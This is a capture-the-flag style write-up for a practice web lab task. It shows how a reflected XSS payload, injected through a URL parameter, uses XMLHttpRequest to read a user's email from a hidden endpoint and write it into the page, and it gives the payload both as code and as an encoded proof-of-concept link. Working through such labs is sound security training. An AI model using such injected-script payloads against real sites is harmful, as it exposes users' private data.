## Task 14 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/14)</small>

Objectives:

1. Find John's Email Address using an XSS vulnerability on this page
2. Display the Email address in the div with id "result"

Yes, there is no input to test. But the XSS is always a client side vulnerability, so after struggling I found a some resource in the source code

![](https://i.imgur.com/iZ5KLkB.png)

So when I opened this path in new tab, I found this

![](https://i.ibb.co/qBthbrB/image.png)

Now we found what we are worried about, let's use XHR to complete this challenge. We need to check for the completion of XHR so that we can get the response text. Luckily we have [`.onreadystatechange`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/onreadystatechange)

```js
const xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200) {
    document.querySelector("#result").textContent = xhttp.responseText;
  }
};

xhttp.open("GET", "http://pentesteracademylab.appspot.com/lab/webapp/jfp/14/email?name=john", true);
xhttp.send();
```

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/14?url=%3Cscript%3Econst%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Axhttp.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20if%20%28this.readyState%20%3D%3D%204%20%26%26%20this.status%20%3D%3D%20200%29%20%7B%0A%20%20%20%20document.querySelector%28%22%23result%22%29.textContent%20%3D%20xhttp.responseText%3B%0A%20%20%7D%0A%7D%3B%0A%0Axhttp.open%28%22GET%22%2C%20%22http%3A%2F%2Fpentesteracademylab.appspot.com%2Flab%2Fwebapp%2Fjfp%2F14%2Femail%3Fname%3Djohn%22%2C%20true%29%3B%0Axhttp.send%28%29%3B%0A%3C%2Fscript%3E)
